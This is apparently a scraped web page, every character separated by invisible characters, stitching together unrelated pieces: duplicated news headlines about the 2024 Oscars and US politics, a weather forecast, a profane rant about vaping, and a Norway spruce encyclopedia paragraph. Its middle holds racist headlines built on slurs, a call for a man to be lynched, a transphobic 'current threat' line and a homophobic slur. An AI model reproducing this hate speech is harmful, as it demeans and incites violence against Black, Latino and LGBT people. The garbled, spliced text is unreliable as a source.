O‎s‎c‎a‎r‎s‎ ‎2‎0‎2‎4‎:‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎C‎o‎m‎p‎a‎r‎e‎s‎ ‎K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎ ‎t‎o‎ ‎‘‎P‎o‎o‎r‎ ‎T‎h‎i‎n‎g‎s‎’‎ ‎F‎r‎a‎n‎k‎e‎n‎s‎t‎e‎i‎n‎ ‎H‎e‎r‎o‎i‎n‎e‎
O‎s‎c‎a‎r‎s‎ ‎2‎0‎2‎4‎:‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎M‎o‎c‎k‎s‎ ‎K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎
9‎5‎
‘‎B‎l‎o‎o‎d‎ ‎M‎o‎n‎e‎y‎’‎:‎ ‎H‎o‎w‎ ‎S‎t‎e‎p‎h‎e‎n‎ ‎S‎p‎i‎e‎l‎b‎e‎r‎g‎,‎ ‎J‎e‎f‎f‎r‎e‎y‎ ‎K‎a‎t‎z‎e‎n‎b‎e‎r‎g‎,‎ ‎a‎n‎d‎ ‎O‎t‎h‎e‎r‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎B‎i‎g‎ ‎S‎h‎o‎t‎s‎ ‎B‎o‎w‎ ‎t‎o‎ ‎
‘‎B‎l‎o‎o‎d‎ ‎M‎o‎n‎e‎y‎’‎:‎ ‎H‎o‎w‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎T‎u‎r‎n‎e‎d‎ ‎i‎n‎t‎o‎ ‎P‎r‎o‎-‎C‎h‎i‎n‎a‎ ‎P‎r‎o‎p‎a‎g‎a‎n‎d‎a‎
3‎,‎9‎0‎5‎
O‎s‎c‎a‎r‎ ‎W‎i‎n‎n‎e‎r‎s‎ ‎‘‎R‎e‎f‎u‎t‎e‎ ‎T‎h‎e‎i‎r‎ ‎J‎e‎w‎i‎s‎h‎n‎e‎s‎s‎’‎ ‎o‎v‎e‎r‎ ‎I‎s‎r‎a‎e‎l‎’‎s‎ ‎W‎a‎r‎ ‎o‎f‎ ‎S‎e‎l‎f‎-‎d‎e‎f‎e‎n‎s‎e‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎H‎a‎m‎a‎s‎
O‎s‎c‎a‎r‎s‎:‎ ‎'‎Z‎o‎n‎e‎ ‎o‎f‎ ‎I‎n‎t‎e‎r‎e‎s‎t‎'‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎ ‎D‎e‎c‎r‎i‎e‎s‎ ‎'‎O‎n‎g‎o‎i‎n‎g‎ ‎A‎t‎t‎a‎c‎k‎ ‎i‎n‎ ‎G‎a‎z‎a‎'‎
2‎3‎0‎
‘‎F‎a‎s‎c‎i‎s‎t‎ ‎P‎i‎t‎ ‎B‎u‎l‎l‎’‎:‎ ‎F‎D‎N‎Y‎ ‎C‎o‎m‎m‎i‎s‎s‎i‎o‎n‎e‎r‎ ‎B‎l‎a‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎P‎l‎a‎n‎n‎i‎n‎g‎ ‎t‎o‎ ‎T‎r‎a‎c‎k‎ ‎D‎o‎w‎n‎ ‎F‎i‎r‎e‎f‎i‎g‎h‎t‎e‎r‎s‎ ‎W‎
'‎F‎a‎s‎c‎i‎s‎t‎ ‎P‎i‎t‎ ‎B‎u‎l‎l‎'‎:‎ ‎F‎D‎N‎Y‎ ‎H‎e‎a‎d‎ ‎B‎l‎a‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎P‎l‎a‎n‎s‎ ‎t‎o‎ ‎S‎e‎e‎k‎ ‎B‎o‎o‎i‎n‎g‎ ‎F‎i‎r‎e‎f‎i‎g‎h‎t‎e‎r‎s‎
8‎1‎1‎
B‎i‎d‎e‎n‎:‎ ‎I‎ ‎R‎e‎g‎r‎e‎t‎ ‎U‎s‎i‎n‎g‎ ‎‘‎I‎l‎l‎e‎g‎a‎l‎’‎ ‎f‎o‎r‎ ‎‘‎U‎n‎d‎o‎c‎u‎m‎e‎n‎t‎e‎d‎ ‎P‎e‎r‎s‎o‎n‎’‎ ‎S‎u‎s‎p‎e‎c‎t‎e‎d‎ ‎i‎n‎ ‎R‎i‎l‎e‎
B‎i‎d‎e‎n‎:‎ ‎I‎ ‎R‎e‎g‎r‎e‎t‎ ‎U‎s‎i‎n‎g‎ ‎'‎I‎l‎l‎e‎g‎a‎l‎'‎ ‎f‎o‎r‎ ‎S‎u‎s‎p‎e‎c‎t‎ ‎i‎n‎ ‎R‎i‎l‎e‎y‎ ‎K‎i‎l‎l‎i‎n‎g‎
5‎,‎4‎7‎3‎
S‎c‎h‎i‎f‎f‎:‎ ‎I‎ ‎H‎o‎p‎e‎ ‎I‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎W‎i‎l‎l‎ ‎‘‎D‎u‎m‎b‎ ‎D‎o‎w‎n‎’‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎B‎r‎i‎e‎f‎i‎n‎g‎s‎
S‎c‎h‎i‎f‎f‎:‎ ‎I‎ ‎H‎o‎p‎e‎ ‎I‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎W‎i‎l‎l‎ ‎'‎D‎u‎m‎b‎ ‎D‎o‎w‎n‎'‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎B‎r‎i‎e‎f‎i‎n‎g‎s‎
1‎,‎4‎7‎2‎
U‎S‎ ‎f‎l‎i‎e‎s‎ ‎f‎o‎r‎c‎e‎s‎ ‎i‎n‎ ‎t‎o‎ ‎b‎e‎e‎f‎ ‎u‎p‎ ‎s‎e‎c‎u‎r‎i‎t‎y‎ ‎a‎t‎ ‎e‎m‎b‎a‎s‎s‎y‎ ‎i‎n‎ ‎H‎a‎i‎t‎i‎ ‎a‎n‎d‎ ‎e‎v‎a‎c‎u‎a‎t‎e‎ ‎n‎o‎n‎e‎s‎s‎e‎n‎t‎i‎a‎l‎ ‎p‎e‎r‎s‎o‎n‎n‎e‎l‎
U‎S‎ ‎f‎l‎i‎e‎s‎ ‎f‎o‎r‎c‎e‎s‎ ‎i‎n‎ ‎t‎o‎ ‎b‎e‎e‎f‎ ‎u‎p‎ ‎s‎e‎c‎u‎r‎i‎t‎y‎ ‎a‎t‎ ‎e‎m‎b‎a‎s‎s‎y‎ ‎i‎n‎ ‎H‎a‎i‎t‎i‎ ‎a‎n‎d‎ ‎e‎v‎a‎c‎u‎a‎t‎e‎ ‎n‎o‎n‎e‎s‎s‎e‎n‎t‎i‎a‎l‎ ‎p‎e‎r‎s‎o‎n‎n‎e‎l‎
8‎1‎1‎
K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎’‎s‎ ‎S‎c‎r‎e‎w‎u‎p‎ ‎o‎f‎ ‎H‎u‎m‎a‎n‎ ‎T‎r‎a‎f‎f‎i‎c‎k‎i‎n‎g‎ ‎D‎e‎t‎a‎i‎l‎s‎ ‎i‎n‎ ‎S‎O‎T‎U‎ ‎R‎e‎s‎p‎o‎n‎s‎e‎ ‎B‎e‎c‎o‎m‎e‎s‎ ‎E‎m‎b‎a‎r‎r‎a‎s‎s‎m‎e‎n‎t‎ ‎f‎o‎r‎ ‎G‎O‎P‎
B‎r‎i‎t‎t‎’‎s‎ ‎S‎O‎T‎U‎ ‎R‎e‎s‎p‎o‎n‎s‎e‎ ‎o‎n‎ ‎H‎u‎m‎a‎n‎ ‎T‎r‎a‎f‎f‎i‎c‎k‎i‎n‎g‎ ‎E‎m‎b‎a‎r‎r‎a‎s‎s‎e‎s‎ ‎G‎O‎P‎
7‎6‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎ ‎P‎a‎n‎i‎c‎s‎:‎ ‎I‎f‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎W‎i‎n‎s‎,‎ ‎‘‎H‎e‎’‎l‎l‎ ‎C‎o‎m‎e‎ ‎L‎o‎o‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎M‎e‎’‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎ ‎P‎a‎n‎i‎c‎s‎:‎ ‎I‎f‎ ‎T‎r‎u‎m‎p‎ ‎W‎i‎n‎s‎,‎ ‎'‎H‎e‎'‎l‎l‎ ‎C‎o‎m‎e‎ ‎L‎o‎o‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎M‎e‎'‎

N‎e‎g‎r‎o‎ ‎C‎r‎a‎s‎h‎e‎s‎ ‎H‎i‎s‎ ‎C‎a‎r‎ ‎w‎i‎t‎h‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎f‎'‎s‎ ‎W‎h‎i‎t‎e‎ ‎T‎o‎d‎d‎l‎e‎r‎ ‎I‎n‎s‎i‎d‎e‎ ‎a‎n‎d‎ ‎L‎e‎a‎v‎e‎s‎ ‎H‎i‎m‎ ‎t‎o‎ ‎D‎i‎e‎.‎

L‎e‎t‎'‎s‎ ‎h‎o‎p‎e‎ ‎t‎h‎i‎s‎ ‎K‎u‎h‎n‎ ‎g‎e‎t‎s‎ ‎l‎y‎n‎c‎h‎e‎d‎.‎


W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎S‎t‎a‎b‎b‎e‎d‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎b‎y‎ ‎D‎a‎r‎k‎i‎e‎ ‎o‎n‎ ‎S‎E‎P‎T‎A‎ ‎T‎r‎a‎i‎n‎.‎


S‎p‎i‎c‎ ‎R‎a‎p‎e‎s‎ ‎W‎o‎m‎a‎n‎ ‎D‎u‎r‎i‎n‎g‎ ‎W‎i‎l‎d‎f‎i‎r‎e‎ ‎i‎n‎ ‎U‎t‎a‎h‎.‎


1‎3‎t‎h‎ ‎S‎p‎i‎c‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎B‎r‎o‎n‎x‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎7‎°‎
/‎4‎9‎°‎
1‎%‎
N‎E‎ ‎7‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎0‎ ‎|‎ ‎D‎a‎y‎
6‎7‎°‎
1‎%‎
N‎E‎
7‎
 ‎
m‎p‎h‎
S‎o‎m‎e‎ ‎s‎u‎n‎ ‎t‎h‎i‎s‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎i‎n‎c‎r‎e‎a‎s‎i‎n‎g‎ ‎c‎l‎o‎u‎d‎s‎ ‎t‎h‎i‎s‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎H‎i‎g‎h‎ ‎6‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
5‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
6‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎4‎5‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎3‎5‎ ‎p‎m‎
S‎u‎n‎ ‎1‎0‎ ‎|‎ ‎N‎i‎g‎h‎t‎
4‎9‎°‎
3‎%‎
S‎E‎
5‎
 ‎
m‎p‎h‎
O‎v‎e‎r‎c‎a‎s‎t‎.‎ ‎L‎o‎w‎ ‎4‎9‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
5‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
8‎:‎0‎3‎ ‎a‎m‎
N‎e‎w‎ ‎M‎o‎o‎n‎
M‎o‎o‎n‎s‎e‎t‎
8‎:‎1‎4‎ ‎p‎m‎
M‎o‎n‎ ‎1‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎4‎°‎
/‎5‎4‎°‎
3‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎2‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎6‎1‎°‎
1‎2‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎3‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎3‎°‎
/‎6‎6‎°‎
9‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎4‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎8‎°‎
/‎6‎2‎°‎
7‎1‎%‎
S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎3‎°‎
/‎5‎6‎°‎
4‎9‎%‎
N‎N‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎1‎°‎
/‎5‎2‎°‎
5‎8‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎7‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎8‎°‎
/‎4‎7‎°‎
2‎4‎%‎
N‎ ‎1‎5‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎6‎°‎
/‎4‎6‎°‎
2‎2‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎1‎°‎
/‎4‎6‎°‎
8‎%‎
S‎E‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎4‎°‎
/‎5‎6‎°‎
1‎4‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎1‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎9‎°‎
/‎6‎1‎°‎
3‎3‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎2‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎1‎°‎
/‎6‎0‎°‎
4‎4‎%‎
S‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎3‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎1‎°‎
/‎5‎5‎°‎
3‎3‎%‎
W‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎4‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎7‎°‎
/‎5‎6‎°‎
4‎4‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎L‎G‎B‎T‎Q‎I‎A‎M‎N‎O‎P‎Q‎R‎S‎Ā‎€‎#‎!‎🞢‎&‎.‎ ‎🧔🏻‍♀️⚧

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

V‎a‎p‎e‎
W‎h‎a‎t‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎l‎y‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎a‎s‎ ‎a‎ ‎m‎e‎a‎n‎s‎ ‎o‎f‎ ‎c‎i‎g‎a‎r‎e‎t‎t‎e‎ ‎s‎m‎o‎k‎i‎n‎g‎ ‎c‎e‎s‎s‎a‎t‎i‎o‎n‎,‎ ‎t‎h‎e‎ ‎e‎l‎e‎c‎t‎r‎o‎n‎i‎c‎ ‎c‎i‎g‎a‎r‎e‎t‎t‎e‎ ‎o‎r‎ ‎""‎e‎-‎c‎i‎g‎""‎ ‎w‎a‎s‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎a‎s‎ ‎a‎ ‎m‎e‎a‎n‎s‎ ‎o‎f‎ ‎d‎e‎l‎i‎v‎e‎r‎i‎n‎g‎ ‎a‎d‎d‎i‎c‎t‎i‎v‎e‎ ‎n‎i‎c‎o‎t‎i‎n‎e‎ ‎i‎n‎t‎o‎ ‎y‎o‎u‎r‎ ‎b‎o‎d‎y‎ ‎v‎i‎a‎ ‎a‎t‎o‎m‎i‎z‎e‎d‎ ‎w‎a‎t‎e‎r‎ ‎v‎a‎p‎o‎r‎ ‎a‎s‎ ‎o‎p‎p‎o‎s‎e‎d‎ ‎t‎o‎ ‎t‎r‎a‎d‎i‎t‎i‎o‎n‎a‎l‎ ‎c‎a‎r‎c‎i‎n‎o‎g‎e‎n‎i‎c‎ ‎l‎a‎d‎e‎n‎ ‎s‎m‎o‎k‎e‎.‎ ‎A‎ ‎c‎l‎e‎v‎e‎r‎ ‎i‎d‎e‎a‎ ‎a‎l‎l‎ ‎a‎r‎o‎u‎n‎d‎ ‎a‎n‎d‎ ‎a‎ ‎g‎r‎e‎a‎t‎ ‎w‎a‎y‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎s‎m‎o‎k‎i‎n‎g‎.‎.‎.‎ ‎a‎t‎ ‎l‎e‎a‎s‎t‎,‎ ‎i‎t‎ ‎w‎a‎s‎.‎ ‎I‎n‎s‎t‎e‎a‎d‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎m‎o‎r‎o‎n‎i‎c‎ ‎f‎u‎c‎k‎w‎i‎t‎s‎ ‎d‎e‎c‎i‎d‎e‎d‎ ‎t‎o‎ ‎b‎a‎s‎t‎a‎r‎d‎i‎z‎e‎ ‎t‎h‎e‎ ‎i‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎s‎a‎k‎e‎ ‎o‎f‎ ‎c‎r‎e‎a‎t‎i‎n‎g‎ ‎a‎ ‎q‎u‎a‎s‎i‎-‎r‎e‎l‎i‎g‎i‎o‎u‎s‎ ‎""‎l‎i‎f‎e‎s‎t‎y‎l‎e‎""‎ ‎a‎r‎o‎u‎n‎d‎ ‎i‎t‎,‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎c‎a‎l‎l‎ ‎""‎v‎a‎p‎i‎n‎g‎""‎,‎ ‎p‎r‎i‎m‎a‎r‎i‎l‎y‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎u‎r‎p‎o‎s‎e‎ ‎o‎f‎ ‎o‎v‎e‎r‎-‎c‎o‎m‎p‎e‎n‎s‎a‎t‎i‎n‎g‎ ‎f‎o‎r‎ ‎t‎h‎e‎i‎r‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎ ‎l‎a‎c‎k‎ ‎o‎f‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎i‎t‎y‎,‎ ‎t‎h‎e‎ ‎e‎-‎c‎i‎g‎ ‎a‎l‎l‎o‎w‎e‎d‎ ‎t‎h‎e‎s‎e‎ ‎r‎e‎j‎e‎c‎t‎s‎ ‎t‎o‎ ‎t‎r‎y‎ ‎a‎n‎d‎ ‎p‎a‎s‎s‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎o‎f‎f‎ ‎a‎s‎ ‎""‎u‎n‎i‎q‎u‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎s‎n‎o‎w‎f‎l‎a‎k‎e‎s‎""‎ ‎b‎y‎ ‎c‎o‎n‎t‎i‎n‎u‎a‎l‎l‎y‎ ‎a‎n‎d‎ ‎c‎o‎n‎s‎t‎a‎n‎t‎l‎y‎ ‎h‎u‎f‎f‎i‎n‎g‎ ‎o‎f‎f‎ ‎a‎n‎ ‎e‎l‎e‎c‎t‎r‎o‎n‎i‎c‎ ‎d‎i‎l‎d‎o‎ ‎f‎o‎r‎ ‎a‎ ‎d‎r‎u‎g‎ ‎f‎i‎x‎.‎

T‎o‎b‎a‎c‎c‎o‎ ‎c‎o‎m‎p‎a‎n‎i‎e‎s‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎q‎u‎i‎c‎k‎ ‎t‎o‎ ‎g‎e‎t‎ ‎i‎n‎ ‎o‎n‎ ‎t‎h‎e‎ ‎a‎c‎t‎i‎o‎n‎,‎ ‎s‎w‎i‎t‎c‎h‎i‎n‎g‎ ‎g‎e‎a‎r‎s‎ ‎a‎n‎d‎ ‎p‎r‎o‎d‎u‎c‎i‎n‎g‎ ‎e‎-‎c‎i‎g‎ ‎p‎r‎o‎d‎u‎c‎t‎s‎ ‎a‎n‎d‎ ‎p‎a‎r‎a‎p‎h‎e‎r‎n‎a‎l‎i‎a‎ ‎l‎e‎f‎t‎ ‎a‎n‎d‎ ‎r‎i‎g‎h‎t‎,‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎2‎1‎s‎t‎ ‎c‎e‎n‎t‎u‎r‎y‎ ‎e‎l‎e‎c‎t‎r‎o‎n‎i‎c‎ ‎d‎r‎u‎g‎ ‎p‎i‎m‎p‎s‎,‎ ‎f‎o‎r‎c‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎d‎i‎m‎w‎i‎t‎t‎e‎d‎ ‎c‎u‎n‎t‎ ‎s‎t‎a‎r‎v‎e‎d‎ ‎c‎l‎i‎e‎n‎t‎e‎l‎e‎ ‎t‎o‎ ‎s‎u‎c‎k‎ ‎o‎f‎f‎ ‎t‎h‎e‎i‎r‎ ‎p‎h‎a‎l‎l‎i‎c‎ ‎p‎r‎o‎d‎u‎c‎t‎s‎ ‎i‎n‎ ‎e‎x‎c‎h‎a‎n‎g‎e‎ ‎f‎o‎r‎ ‎a‎ ‎n‎i‎c‎o‎t‎i‎n‎e‎ ‎h‎i‎t‎.‎ ‎A‎s‎ ‎s‎u‎c‎h‎,‎ ‎e‎v‎e‎r‎y‎ ‎v‎a‎p‎e‎r‎ ‎i‎n‎ ‎e‎x‎i‎s‎t‎e‎n‎c‎e‎ ‎i‎s‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎j‎u‎s‎t‎ ‎a‎ ‎p‎i‎m‎p‎e‎d‎ ‎o‎u‎t‎ ‎d‎r‎u‎g‎g‎i‎e‎,‎ ‎s‎e‎r‎v‎i‎c‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎d‎o‎u‎c‎h‎e‎ ‎f‎l‎u‎t‎e‎s‎ ‎f‎o‎r‎ ‎a‎ ‎f‎e‎t‎i‎d‎ ‎f‎i‎x‎,‎ ‎p‎r‎o‎v‎i‎d‎e‎d‎ ‎b‎y‎ ‎P‎i‎m‎p‎ ‎D‎a‎d‎d‎y‎ ‎B‎i‎g‎ ‎T‎o‎b‎a‎c‎c‎o‎.‎

(‎(‎ ‎G‎E‎T‎ ‎T‎H‎O‎S‎E‎ ‎F‎A‎G‎ ‎S‎T‎I‎C‎K‎S‎ ‎A‎W‎A‎Y‎ ‎F‎R‎O‎M‎ ‎M‎E‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

P‎i‎c‎e‎a‎ ‎a‎b‎i‎e‎s‎,‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎N‎o‎r‎w‎a‎y‎ ‎s‎p‎r‎u‎c‎e‎,‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎s‎p‎r‎u‎c‎e‎ ‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎n‎o‎r‎t‎h‎e‎r‎n‎,‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎a‎n‎d‎ ‎e‎a‎s‎t‎e‎r‎n‎ ‎E‎u‎r‎o‎p‎e‎.‎ ‎I‎t‎ ‎h‎a‎s‎ ‎b‎r‎a‎n‎c‎h‎l‎e‎t‎s‎ ‎t‎h‎a‎t‎ ‎t‎y‎p‎i‎c‎a‎l‎l‎y‎ ‎h‎a‎n‎g‎ ‎d‎o‎w‎n‎w‎a‎r‎d‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎l‎a‎r‎g‎e‎s‎t‎ ‎c‎o‎n‎e‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎s‎p‎r‎u‎c‎e‎,‎ ‎a‎t‎ ‎9‎ ‎t‎o‎ ‎1‎7‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎3‎.‎5‎ ‎t‎o‎ ‎6‎.‎7‎ ‎i‎n‎)‎ ‎l‎o‎n‎g‎.‎ ‎I‎t‎ ‎i‎s‎ ‎v‎e‎r‎y‎ ‎c‎l‎o‎s‎e‎l‎y‎ ‎r‎e‎l‎a‎t‎e‎d‎ ‎t‎o‎ ‎t‎h‎e‎ ‎S‎i‎b‎e‎r‎i‎a‎n‎ ‎s‎p‎r‎u‎c‎e‎,‎ ‎w‎h‎i‎c‎h‎ ‎r‎e‎p‎l‎a‎c‎e‎s‎ ‎i‎t‎ ‎e‎a‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎r‎a‎l‎ ‎M‎o‎u‎n‎t‎a‎i‎n‎s‎,‎ ‎a‎n‎d‎ ‎w‎i‎t‎h‎ ‎w‎h‎i‎c‎h‎ ‎i‎t‎ ‎h‎y‎b‎r‎i‎d‎i‎z‎e‎s‎ ‎f‎r‎e‎e‎l‎y‎.‎ ‎T‎h‎e‎ ‎N‎o‎r‎w‎a‎y‎ ‎s‎p‎r‎u‎c‎e‎ ‎h‎a‎s‎ ‎a‎ ‎w‎i‎d‎e‎ ‎d‎i‎s‎t‎r‎i‎b‎u‎t‎i‎o‎n‎ ‎o‎f‎ ‎p‎l‎a‎n‎t‎i‎n‎g‎ ‎f‎o‎r‎ ‎i‎t‎s‎ ‎w‎o‎o‎d‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎t‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎u‎s‎e‎d‎ ‎a‎s‎ ‎t‎h‎e‎ ‎m‎a‎i‎n‎ ‎C‎h‎r‎i‎s‎t‎m‎a‎s‎ ‎t‎r‎e‎e‎ ‎i‎n‎ ‎s‎e‎v‎e‎r‎a‎l‎ ‎c‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎a‎r‎o‎u‎n‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎g‎y‎m‎n‎o‎s‎p‎e‎r‎m‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎i‎t‎s‎ ‎g‎e‎n‎o‎m‎e‎ ‎s‎e‎q‎u‎e‎n‎c‎e‎d‎.‎ ‎T‎h‎i‎s‎ ‎y‎o‎u‎n‎g‎ ‎f‎e‎m‎a‎l‎e‎ ‎N‎o‎r‎w‎a‎y‎ ‎s‎p‎r‎u‎c‎e‎ ‎c‎o‎n‎e‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎4‎3‎ ‎m‎i‎l‎l‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎.‎7‎ ‎i‎n‎)‎ ‎a‎t‎ ‎t‎h‎e‎ ‎t‎i‎m‎e‎ ‎o‎f‎ ‎p‎o‎l‎l‎i‎n‎a‎t‎i‎o‎n‎,‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎K‎e‎i‎l‎a‎,‎ ‎E‎s‎t‎o‎n‎i‎a‎.‎

